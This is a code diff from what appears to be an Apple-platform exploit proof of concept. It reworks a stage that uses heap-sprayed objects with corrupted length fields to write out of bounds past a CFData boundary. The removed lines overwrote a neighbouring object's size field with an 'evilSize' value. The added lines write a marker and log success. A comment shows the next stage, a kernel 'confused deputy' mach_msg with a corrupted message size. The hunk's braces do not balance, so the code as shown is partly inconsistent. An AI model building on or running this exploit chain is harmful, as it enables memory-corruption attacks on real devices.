@@ -1369,36 +1369,31 @@ cleanup:
     } else {
         scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed object(s) corrupted: +%d grew / %d shrank",
                       hits, grew, shrank]);
-        // ---- OOB WRITE: corrupt next object's SIZE via grown length ----
-        // Object layout: [u32 len | u32 size | u8 data[24]] = 32 bytes
-        // Data starts at obj+8. Next object's size is at obj+36 = dataStart+28.
+        // ---- OOB WRITE: use grown CFData length to write past object ----
+        // Layout: 16-byte objects {u64 tag; u32 length; u32 cap} + data
+        // Grown length means we can write past the 0x100 logical boundary.
         for (int i = 0; i < got && firstIdx >= 0; i += 2) {
             uint8_t *b = bufs[i];
             if (!b) continue;
-            for (size_t o = 0; o + OBJ_SZ * 2 <= scanEnd; o += OBJ_SZ) {
-                uint32_t len = *(uint32_t *)(b + o);
-                if (len <= OBJ_LEN) continue;  // only GROWN
-                uint8_t *dataStart = b + o + 8;
-                size_t maxSafe = spraySz - o - 8;
-                size_t szOff = OBJ_SZ - 8 + 4;  // = 28 (next object's size field)
-                if (szOff + 4 > maxSafe) continue;
-
-                uint32_t szBefore = *(uint32_t *)(dataStart + szOff);
-                scopeNote(r, [NSString stringWithFormat:
-                    @"  OOB-WRITE: obj buf %d off %zu  len=0x%x  target: next SIZE @ data+%zu  before=0x%08x",
-                    i, o, len, szOff, szBefore]);
-
-                uint32_t evilSize = 0x00000042;
-                if (szOff + 4 <= maxSafe) {
-                    *(uint32_t *)(dataStart + szOff) = evilSize;
-                    uint32_t szAfter = *(uint32_t *)(dataStart + szOff);
+            for (size_t o = 0; o + 16 <= scanEnd; o += 16) {
+                uint32_t len = *(uint32_t *)(b + o + 8);
+                if (len <= 0x100) continue;  // only GROWN
+                // Data starts at obj+16 (after 16-byte header)
+                uint8_t *dataStart = b + o + 16;
+                size_t maxSafe = spraySz - o - 16;
+                // Write marker at offset 0x100 (past logical boundary)
+                size_t markOff = 0x100;
+                if (markOff + 8 <= maxSafe) {
+                    uint64_t before = *(uint64_t *)(dataStart + markOff);
+                    *(uint64_t *)(dataStart + markOff) = 0xDEADBEEFCAFEBABEULL;
+                    uint64_t after = *(uint64_t *)(dataStart + markOff);
                     scopeNote(r, [NSString stringWithFormat:
-                        @"    wrote 0x%08x at data+%zu  readback=0x%08x", evilSize, szOff, szAfter]);
-                    if (szAfter == evilSize) {
-                        scopeNote(r, @"  >>> SIZE FIELD CORRUPTED via OOB write — target acquired!");
-                        scopeNote(r, [NSString stringWithFormat:
-                            @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
-                            (int)szAfter - (int)szBefore]);
+                        @"  OOB-WRITE: buf %d off %zu  len=0x%x  write at data+0x100  before=0x%016llx  after=0x%016llx",
+                        i, o, len, before, after]);
+                    if (after == 0xDEADBEEFCAFEBABEULL) {
+                        scopeNote(r, @"  >>> OOB WRITE CONFIRMED — marker past CFData length boundary!");
+                    }
+                }
 
                         // ---- CONFUSED DEPUTY: mach_msg with corrupted msgh_size ----
                         // Use a real port pair so kernel actually copies the message.
